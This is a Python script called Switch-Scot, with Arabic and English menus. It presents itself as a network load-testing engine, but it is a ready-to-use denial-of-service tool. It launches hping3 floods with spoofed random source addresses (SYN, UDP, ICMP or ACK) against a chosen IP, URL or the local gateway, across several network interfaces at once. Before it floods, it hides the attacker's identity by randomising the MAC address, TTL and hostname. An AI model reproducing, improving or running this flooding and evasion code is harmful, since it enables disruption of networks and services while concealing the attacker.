#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Switch-Scot ⚡
Universal Multi-Interface Network Resilience & Load Testing Engine
Designed for Linux (Arch, Kali, Debian, Ubuntu) and Android (Termux)
Developed by: Mohammed Yaqeen (Yemen - Sana'a) | محمد يقين مجمل الفايق
"""

import os
import sys
import re
import random
import signal
import subprocess
import argparse
import time
import socket
from urllib.parse import urlparse
from datetime import datetime

def ar(text):
    """Re-shapes and applies BiDi algorithm to render Arabic correctly in terminals like QTerminal, Xterm, Alacritty."""
    if not text:
        return text
    try:
        import arabic_reshaper
        from bidi.algorithm import get_display
        reshaper = arabic_reshaper.ArabicReshaper(configuration={'delete_harakat': False, 'support_ligatures': True})
        reshaped = reshaper.reshape(str(text))
        return get_display(reshaped)
    except Exception:
        return text

def get_banner():
    dev_ar = ar("المطور : محمد يقين مجمل الفايق | صنعاء - اليمن")
    return f"""
   _____         _ _       _         ____             _   
  / ____|       (_) |     | |       / ____|          | |  
 | (_____      ___| |_ ___| |__ ___| (___   ___  ___ | |_ 
  \\___ \\ \\ /\\ / / | __/ __| '_ \\_____\\___ \\ / __|/ _ \\| __|
  ____) \\ V  V /| | || (__| | | |    ____) | (__| (_) | |_ 
 |_____/ \\_/\\_/ |_|\\__\\___|_| |_|   |_____/ \\___|\\___/ \\__|
                                                           ⚡ v3.7
 🇾🇪 {dev_ar}
 🇾🇪 Author : Mohammed Yaqeen | Sana'a - Yemen
"""

MESSAGES = {
    "ar": {
        "menu_title": ar("=== لوحة التحكم والتشغيل التفاعلي السريع ==="),
        "detected_ifaces": ar("* كروت الشبكة المكتشفة في جهازك:"),
        "all_ifaces": "A. " + ar("تشغيل كل الكروت معاً في نفس الوقت (وضع التيربو الخارق 🚀)"),
        "select_iface": ">> " + ar("رقم الكرت المطلوب [الافتراضي 1]: "),
        "selected_iface": "* " + ar("الكروت المختارة: "),
        "enter_target": ">> " + ar("عنوان الهدف أو الرابط [الافتراضي {default}]: "),
        "target_ip": "* " + ar("عنوان الهدف: "),
        "extracted_port": "* " + ar("المنفذ المستخرج تلقائياً: "),
        "enter_port": ">> " + ar("رقم المنفذ المطلوب [الافتراضي {default}]: "),
        "final_port": "* " + ar("المنفذ النهائي: "),
        "modes_title": ar("* أوضاع الفحص والتقييم المتاحة:"),
        "mode_1": "1. TCP-SYN " + ar("(استنزاف طابور اتصالات الراوتر - الأقوى)"),
        "mode_2": "2. UDP " + ar("(ضغط الذاكرة المؤقتة للراوتر)"),
        "mode_3": "3. ICMP " + ar("(قياس سرعة استجابة وتأخير المعالج)"),
        "mode_4": "4. TCP-ACK " + ar("(فحص واختبار جدار الحماية)"),
        "select_mode": ">> " + ar("رقم وضع الفحص [الافتراضي 1]: "),
        "selected_mode": "* " + ar("الوضع المعتمد: "),
        "hostname_prompt": ">> " + ar("اسم الجهاز المنحول في الراوتر [اضغط Enter للاسم العشوائي]: "),
        "custom_host_set": "* " + ar("اسم الجهاز المعتمد: "),
        "random_host_set": "* " + ar("اسم الجهاز: توليد ذكي عشوائي"),
        "mac_title": ar("* خيارات الماك أدرس (MAC Address):"),
        "mac_1": "1. " + ar("الإبقاء على الماك الحالي (موصى به لثبات الواي فاي)"),
        "mac_2": "2. " + ar("تدوير الماك عشوائياً (تمويه فيزيائي شامل)"),
        "select_mac": ">> " + ar("خيار الماك [الافتراضي 1]: "),
        "mac_safe": "* " + ar("سياسة الماك: الحفاظ على الماك الحالي لثبات الاتصال"),
        "mac_random": "* " + ar("سياسة الماك: تدوير الماك عشوائياً"),
        "press_enter": ">> " + ar("اضغط ENTER للبدء والانطلاق فوراً..."),
        "engine_active": "⚡ " + ar("محرك SWITCH-SCOT يعمل الآن بأقصى طاقة") + " ⚡",
        "platform": "* " + ar("بيئة التشغيل : "),
        "interfaces": "* " + ar("كروت الشبكة : "),
        "hostname": "* " + ar("اسم الجهاز  : "),
        "mode_info": "* " + ar("وضع الفحص  : "),
        "press_ctrl_c": "\n[*] " + ar("اضغط Ctrl+C في أي وقت لإيقاف العملية بأمان.") + "\n",
        "running_status": "\r>> [" + ar("جاري الضخ") + "] " + ar("الهدف:") + " {target}:{port} | " + ar("الكروت:") + " [{ifaces}] | " + ar("النمط:") + " {mode} | " + ar("الوقت:") + " {elapsed} ",
        "stopped": "\n\n[+] " + ar("تم إيقاف عملية الضخ بنجاح على جميع الكروت."),
        "root_error_termux": "\n[!] " + ar("تنبيه: يلزم صلاحيات الروت. اكتب tsu أولاً ثم شغل الأداة."),
        "root_error_linux": "\n[!] " + ar("تنبيه: يلزم صلاحيات الروت. شغل الأداة بأمر sudo switch-scot"),
        "missing_tools": "\n[!] " + ar("تنبيه: هناك أدوات مفقودة في نظامك:") + " {tools}",
        "termux_install_hint": "[*] " + ar("للتثبيت على تيرمكس: pkg install root-repo && pkg install tsu hping3 macchanger iproute2"),
        "debian_install_hint": "[*] " + ar("للتثبيت على دبيان أو كالي: sudo apt install -y hping3 macchanger iproute2"),
        "arch_install_hint": "[*] " + ar("للتثبيت على آرش لينكس: sudo pacman -S --noconfirm hping macchanger iproute2"),
        "applying_stealth": "\n[*] " + ar("جاري تطبيق التمويه وتجهيز الهوية..."),
        "verifying_carrier": "[*] " + ar("جاري التحقق من جاهزية كرت الشبكة ومسار التوجيه على") + " {iface}...",
        "carrier_ready": "[+] " + ar("كرت الشبكة") + " {iface} " + ar("متصل ومسار التوجيه إلى") + " {target} " + ar("جاهز."),
        "carrier_timeout": "[!] " + ar("تنبيه: تم بدء الإرسال المباشر على") + " {iface}."
    },
    "en": {
        "menu_title": "=== Switch-Scot Interactive Setup Menu ===",
        "detected_ifaces": "* Detected Network Interfaces:",
        "all_ifaces": "A. Use ALL Interfaces Simultaneously (Turbo Mode 🚀)",
        "select_iface": ">> Select Interface(s) [Default 1]: ",
        "selected_iface": "* Selected Interfaces: ",
        "enter_target": ">> Target IP or URL [Default {default}]: ",
        "target_ip": "* Target Host/IP: ",
        "extracted_port": "* Extracted Port: ",
        "enter_port": ">> Target Port [Default {default}]: ",
        "final_port": "* Final Port: ",
        "modes_title": "* Available Evaluation Modes:",
        "mode_1": "1. TCP-SYN (Connection Table Saturation - Strongest)",
        "mode_2": "2. UDP (Stateless Buffer Stress)",
        "mode_3": "3. ICMP (Control Plane Latency)",
        "mode_4": "4. TCP-ACK (Stateful Firewall Inspection)",
        "select_mode": ">> Select Mode [Default 1]: ",
        "selected_mode": "* Selected Mode: ",
        "hostname_prompt": ">> Custom Device Hostname [Press Enter for Random]: ",
        "custom_host_set": "* Custom Hostname: ",
        "random_host_set": "* Hostname: Random Smart Device",
        "mac_title": "* MAC Address Policy:",
        "mac_1": "1. Keep Current MAC (Recommended for stable Wi-Fi)",
        "mac_2": "2. Randomize MAC Address (Full Spoof)",
        "select_mac": ">> Select Policy [Default 1]: ",
        "mac_safe": "* MAC Policy: Keep Current MAC",
        "mac_random": "* MAC Policy: Randomize MAC",
        "press_enter": ">> Press [ENTER] to Launch Switch-Scot...",
        "engine_active": "⚡ SWITCH-SCOT MULTI-INTERFACE ENGINE ACTIVE ⚡",
        "platform": "* Platform   : ",
        "interfaces": "* Interfaces : ",
        "hostname": "* Hostname   : ",
        "mode_info": "* Mode/Target: ",
        "press_ctrl_c": "\n[*] Press Ctrl+C at any time to safely stop.\n",
        "running_status": "\r>> [RUNNING] Target: {target}:{port} | Active Cards: [{ifaces}] | Mode: {mode} | Elapsed: {elapsed} ",
        "stopped": "\n\n[+] Switch-Scot execution stopped on all interfaces.",
        "root_error_termux": "\n[!] Error: Root privileges required. Run with 'tsu'",
        "root_error_linux": "\n[!] Error: Root privileges required. Run with 'sudo switch-scot'",
        "missing_tools": "\n[!] Missing required system tools: {tools}",
        "termux_install_hint": "[*] Install on Termux: pkg install root-repo && pkg install tsu hping3 macchanger iproute2",
        "debian_install_hint": "[*] Install on Debian/Kali: sudo apt install -y hping3 macchanger iproute2",
        "arch_install_hint": "[*] Install on Arch: sudo pacman -S --noconfirm hping macchanger iproute2",
        "applying_stealth": "\n[*] Applying persistent obfuscation layer...",
        "verifying_carrier": "[*] Verifying carrier link and route readiness on {iface}...",
        "carrier_ready": "[+] Interface {iface} connected. Route to {target} verified.",
        "carrier_timeout": "[!] Notice: Link timeout reached. Proceeding on {iface}."
    }
}

class SwitchScot:
    def __init__(self, target="10.0.0.1", port=80, interfaces=None, mode="tcp-syn", skip_mac=False, custom_hostname=None, lang="ar"):
        self.lang = lang if lang in MESSAGES else "ar"
        self.msg = MESSAGES[self.lang]
        
        parsed_target, parsed_port = self.parse_target(target, port)
        self.target = parsed_target
        self.port = parsed_port
        self.mode = mode
        self.skip_mac = skip_mac
        self.custom_hostname = custom_hostname
        self.is_termux = self.check_termux()
        
        if interfaces is None:
            self.interfaces = [self.detect_default_interface()]
        elif isinstance(interfaces, str):
            self.interfaces = [i.strip() for i in interfaces.split(",") if i.strip()]
        else:
            self.interfaces = list(interfaces)
            
        if not self.interfaces:
            self.interfaces = [self.detect_default_interface()]

        self.attack_processes = []
        self.start_time = None
        self.current_macs = {}
        self.current_hostname = "N/A"

    @staticmethod
    def parse_target(raw_input, default_port=80):
        if not raw_input:
            return "10.0.0.1", default_port or 80

        raw_input = str(raw_input).strip()
        target_port = default_port or 80

        if not raw_input.startswith(('http://', 'https://')):
            match = re.match(r'^([^/:]+):(\d+)(/.*)?$', raw_input)
            if match:
                host = match.group(1)
                target_port = int(match.group(2))
                return host, target_port
            test_url = 'http://' + raw_input
        else:
            test_url = raw_input

        try:
            parsed = urlparse(test_url)
            host = parsed.hostname or raw_input
            if parsed.port:
                target_port = parsed.port
            elif parsed.scheme == 'https':
                target_port = 443
            elif parsed.scheme == 'http':
                target_port = 80
            
            try:
                ip = socket.gethostbyname(host)
                return ip, target_port
            except Exception:
                return host, target_port
        except Exception:
            return raw_input, target_port

    @staticmethod
    def check_termux():
        return "com.termux" in os.environ.get("PREFIX", "") or os.path.exists("/data/data/com.termux")

    def check_root(self):
        if os.geteuid() != 0:
            if self.is_termux:
                print(self.msg["root_error_termux"])
            else:
                print(self.msg["root_error_linux"])
            sys.exit(1)

    def check_dependencies(self):
        required_tools = ["hping3", "ip"]
        if not self.skip_mac:
            required_tools.append("macchanger")

        missing = []
        for tool in required_tools:
            if subprocess.run(["which", tool], capture_output=True).returncode != 0:
                missing.append(tool)
        
        if missing:
            print(self.msg["missing_tools"].format(tools=', '.join(missing)))
            if self.is_termux:
                print(self.msg["termux_install_hint"])
            elif os.path.exists("/etc/arch-release"):
                print(self.msg["arch_install_hint"])
            else:
                print(self.msg["debian_install_hint"])
            sys.exit(1)

    @staticmethod
    def get_available_interfaces():
        try:
            return [f for f in os.listdir('/sys/class/net') if f != 'lo']
        except Exception:
            return ["wlan0"]

    @staticmethod
    def detect_gateway():
        try:
            out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"default via (\d{1,3}(\.\d{1,3}){3})", out)
            if match:
                return match.group(1)
        except Exception:
            pass
        return "10.0.0.1"

    def detect_default_interface(self):
        try:
            out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"dev\s+([^\s]+)", out)
            if match:
                return match.group(1)
        except Exception:
            pass

        ifaces = self.get_available_interfaces()
        return ifaces[0] if ifaces else "wlan0"

    def get_mac_address(self, iface):
        try:
            out = subprocess.check_output(["ip", "link", "show", iface], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"link/ether\s+(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})", out)
            return match.group(1) if match else "Unknown"
        except Exception:
            return "Unknown"

    def wait_for_carrier_and_route(self, iface, timeout=15):
        print(self.msg["verifying_carrier"].format(iface=iface))
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            carrier_ok = False
            carrier_file = f"/sys/class/net/{iface}/carrier"
            operstate_file = f"/sys/class/net/{iface}/operstate"

            if os.path.exists(carrier_file):
                try:
                    with open(carrier_file, "r") as f:
                        if f.read().strip() == "1":
                            carrier_ok = True
                except Exception:
                    pass
            elif os.path.exists(operstate_file):
                try:
                    with open(operstate_file, "r") as f:
                        if f.read().strip() in ["up", "unknown"]:
                            carrier_ok = True
                except Exception:
                    pass
            else:
                carrier_ok = True

            if carrier_ok:
                try:
                    res = subprocess.run(["ip", "route", "get", self.target], capture_output=True)
                    if res.returncode == 0:
                        print(self.msg["carrier_ready"].format(iface=iface, target=self.target))
                        return True
                except Exception:
                    pass

            time.sleep(1)

        print(self.msg["carrier_timeout"].format(iface=iface))
        return False

    def randomize_identity(self):
        print(self.msg["applying_stealth"])
        
        # 1. Randomize TTL (64 - 128)
        new_ttl = random.randint(64, 128)
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_default_ttl={new_ttl}"], capture_output=True)

        # 2. Set Device Hostname
        if self.custom_hostname:
            new_host = self.custom_hostname.replace(" ", "-")
        else:
            host_pool = [
                "iPhone-14-Pro", "iPad-Air", "Galaxy-S23", "Pixel-8-Pro", 
                "MacBook-Pro-M2", "Dell-XPS-15", "ThinkPad-X1", "Smart-TV-LG",
                "Workstation-X", "Ubuntu-Server", "Surface-Laptop"
            ]
            new_host = f"{random.choice(host_pool)}-{random.randint(100, 999)}"
            
        subprocess.run(["hostname", new_host], capture_output=True)
        self.current_hostname = new_host

        # 3. Randomize MAC Address for all selected interfaces
        for iface in self.interfaces:
            if not self.skip_mac:
                print(f"[*] Cycling MAC address on {iface}...")
                subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
                subprocess.run(["macchanger", "-r", iface], capture_output=True)
                subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
                self.current_macs[iface] = self.get_mac_address(iface)
                self.wait_for_carrier_and_route(iface)
            else:
                self.current_macs[iface] = self.get_mac_address(iface)

        # 4. Flush ARP neighbor cache
        subprocess.run(["ip", "neigh", "flush", "all"], capture_output=True)

    def build_command_for_interface(self, iface):
        base_cmd = ["hping3", "--flood", "--rand-source", "-I", iface]
        
        if self.mode == "tcp-syn":
            return base_cmd + ["-p", str(self.port), "-S", self.target]
        elif self.mode == "udp":
            return base_cmd + ["--udp", "-p", str(self.port), self.target]
        elif self.mode == "icmp":
            return base_cmd + ["--icmp", self.target]
        elif self.mode == "tcp-ack":
            return base_cmd + ["-p", str(self.port), "-A", self.target]
        else:
            return base_cmd + ["-p", str(self.port), "-S", self.target]

    def start(self):
        self.check_root()
        self.check_dependencies()
        self.randomize_identity()

        print("\n" + "=" * 65)
        print(f" {self.msg['engine_active']}")
        print(f" {self.msg['platform']}{'Android (Termux)' if self.is_termux else 'Linux OS'}")
        ifaces_info = [f"{i} ({self.current_macs.get(i, 'N/A')})" for i in self.interfaces]
        print(f" {self.msg['interfaces']}{', '.join(ifaces_info)}")
        print(f" {self.msg['hostname']}{self.current_hostname}")
        print(f" {self.msg['mode_info']}{self.mode.upper()} | Target: {self.target}:{self.port if self.mode != 'icmp' else 'ICMP'}")
        print("=" * 65)
        print(self.msg["press_ctrl_c"])

        self.start_time = datetime.now()
        try:
            for iface in self.interfaces:
                cmd = self.build_command_for_interface(iface)
                proc = subprocess.Popen(
                    cmd,
                    preexec_fn=os.setsid,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                self.attack_processes.append(proc)
            
            ifaces_str = ", ".join(self.interfaces)
            while True:
                elapsed = str(datetime.now() - self.start_time).split(".")[0]
                status_text = self.msg["running_status"].format(
                    target=self.target,
                    port=self.port,
                    ifaces=ifaces_str,
                    mode=self.mode.upper(),
                    elapsed=elapsed
                )
                sys.stdout.write(status_text)
                sys.stdout.flush()
                time.sleep(1)

        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        for proc in self.attack_processes:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except Exception:
                pass
        print(self.msg["stopped"])
        sys.exit(0)

def run_interactive_menu():
    print(get_banner())
    
    print("=" * 65)
    print(" 1. 🇾🇪 " + ar("اللغة العربية") + " (Arabic)")
    print(" 2. 🏴‍☠️ English")
    print("=" * 65)
    lang_sel = input(">> Select Language / " + ar("اختر اللغة") + " [Default 1]: ").strip()
    lang = "en" if lang_sel == "2" else "ar"
    msg = MESSAGES[lang]

    print("\n" + msg["menu_title"])
    print("-" * 65)

    # 1. Multi-Interface Selection
    ifaces = SwitchScot.get_available_interfaces()
    default_iface = ifaces[0] if ifaces else "wlan0"
    
    print(f"\n{msg['detected_ifaces']}")
    for idx, iface in enumerate(ifaces, start=1):
        tag = f" ({ar('الافتراضي')})" if idx == 1 and lang == "ar" else (" (Default)" if idx == 1 else "")
        print(f"  {idx}. {iface}{tag}")
    print(f"  {msg['all_ifaces']}")
    
    sel_iface = input(f"\n{msg['select_iface']}").strip().lower()
    
    chosen_ifaces = []
    if sel_iface in ["a", "all", "ش", "الكل"]:
        chosen_ifaces = ifaces
    elif sel_iface:
        parts = re.split(r'[, ]+', sel_iface)
        for p in parts:
            try:
                num = int(p)
                if 1 <= num <= len(ifaces):
                    chosen_ifaces.append(ifaces[num - 1])
            except ValueError:
                if p in ifaces:
                    chosen_ifaces.append(p)
        chosen_ifaces = list(dict.fromkeys(chosen_ifaces))
    
    if not chosen_ifaces:
        chosen_ifaces = [default_iface]
        
    print(f"{msg['selected_iface']}{', '.join(chosen_ifaces)}")

    # 2. Target IP or URL Selection
    detected_gw = SwitchScot.detect_gateway()
    target_input = input(f"\n{msg['enter_target'].format(default=detected_gw)}").strip()
    raw_target = target_input if target_input else detected_gw
    
    extracted_host, extracted_port = SwitchScot.parse_target(raw_target, default_port=80)
    print(f"{msg['target_ip']}{extracted_host}")
    if raw_target.startswith(('http://', 'https://')) or ":" in raw_target:
        print(f"{msg['extracted_port']}{extracted_port}")

    # 3. Port Selection
    port_input = input(f"\n{msg['enter_port'].format(default=extracted_port)}").strip()
    try:
        chosen_port = int(port_input) if port_input else extracted_port
    except ValueError:
        chosen_port = extracted_port
    print(f"{msg['final_port']}{chosen_port}")

    # 4. Mode Selection
    modes = [
        ("tcp-syn", msg["mode_1"]),
        ("udp",     msg["mode_2"]),
        ("icmp",    msg["mode_3"]),
        ("tcp-ack", msg["mode_4"])
    ]
    print(f"\n{msg['modes_title']}")
    for idx, (m_id, m_desc) in enumerate(modes, start=1):
        print(f"  {m_desc}")
    
    sel_mode = input(f"\n{msg['select_mode']}").strip()
    try:
        chosen_mode = modes[int(sel_mode) - 1][0] if sel_mode else "tcp-syn"
    except (ValueError, IndexError):
        chosen_mode = "tcp-syn"
    print(f"{msg['selected_mode']}{chosen_mode.upper()}")

    # 5. Hostname Policy
    host_input = input(f"\n{msg['hostname_prompt']}").strip()
    custom_host = host_input if host_input else None
    if custom_host:
        print(f"{msg['custom_host_set']}{custom_host}")
    else:
        print(f"{msg['random_host_set']}")

    # 6. MAC Address Policy
    print(f"\n{msg['mac_title']}")
    print(f"  {msg['mac_1']}")
    print(f"  {msg['mac_2']}")
    mac_choice = input(f"\n{msg['select_mac']}").strip()
    skip_mac = False if mac_choice == "2" else True
    print(f"{msg['mac_safe'] if skip_mac else msg['mac_random']}")

    # Launch Engine
    print("\n" + "=" * 65)
    input(msg["press_enter"])
    
    engine = SwitchScot(
        target=extracted_host,
        port=chosen_port,
        interfaces=chosen_ifaces,
        mode=chosen_mode,
        skip_mac=skip_mac,
        custom_hostname=custom_host,
        lang=lang
    )
    engine.start()

def main():
    if len(sys.argv) == 1:
        run_interactive_menu()
        return

    parser = argparse.ArgumentParser(
        description="Switch-Scot ⚡ Universal Multi-Interface Network Resilience & Load Testing Engine",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "-t", "--target",
        default="10.0.0.1",
        help="Target IP address or Web URL (e.g. 192.168.8.1 or http://router.lan:8080/login.html)"
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=None,
        help="Target Port (Default: Auto-extracted from URL or 80)"
    )
    parser.add_argument(
        "-i", "--interfaces",
        nargs="+",
        default=None,
        help="Network interface(s) to bind (e.g. -i wlp4s0 wlp9s0f4u2 or 'all')"
    )
    parser.add_argument(
        "-H", "--hostname",
        default=None,
        help="Custom device name/hostname to appear on target (Default: Random smart device)"
    )
    parser.add_argument(
        "-m", "--mode",
        choices=["tcp-syn", "udp", "icmp", "tcp-ack"],
        default="tcp-syn",
        help="Evaluation Mode:\n"
             "  tcp-syn  : TCP SYN Connection Load (Default)\n"
             "  udp      : UDP Stateless Buffer Stress\n"
             "  icmp     : ICMP Echo Control Plane Latency\n"
             "  tcp-ack  : TCP ACK Stateful Filter Inspection"
    )
    parser.add_argument(
        "--no-mac",
        action="store_true",
        help="Skip MAC address randomization (Recommended for active Wi-Fi on laptops)"
    )
    parser.add_argument(
        "-l", "--lang",
        choices=["ar", "en"],
        default="ar",
        help="Display language: [ar] for Arabic (Default), [en] for English"
    )

    args = parser.parse_args()
    
    cli_ifaces = args.interfaces
    if cli_ifaces and len(cli_ifaces) == 1 and cli_ifaces[0].lower() in ["all", "a", "الكل"]:
        cli_ifaces = SwitchScot.get_available_interfaces()

    engine = SwitchScot(
        target=args.target,
        port=args.port,
        interfaces=cli_ifaces,
        mode=args.mode,
        skip_mac=args.no_mac,
        custom_hostname=args.hostname,
        lang=args.lang
    )
    engine.start()

if __name__ == "__main__":
    main()
